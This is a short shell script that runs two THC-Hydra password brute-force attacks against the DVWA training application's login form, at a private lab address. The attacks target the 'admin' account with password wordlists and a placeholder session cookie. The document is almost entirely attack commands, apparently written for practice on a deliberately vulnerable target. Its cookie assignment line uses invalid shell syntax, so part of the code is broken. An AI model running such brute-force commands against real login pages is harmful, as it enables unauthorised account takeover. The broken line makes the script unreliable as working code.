. ./hydra_pre.sh

$PHPSESSID="a remplir"

hydra 192.168.56.71 -l admin \
   -P ./list_password.txt \
   http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=$PHPSESSID"

hydra 192.168.56.71 -I -l admin \
   -P ./liste_pass.txt -v \
   http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${PHPSESSID}; security=low :S=Welcome to the password protected area admin"
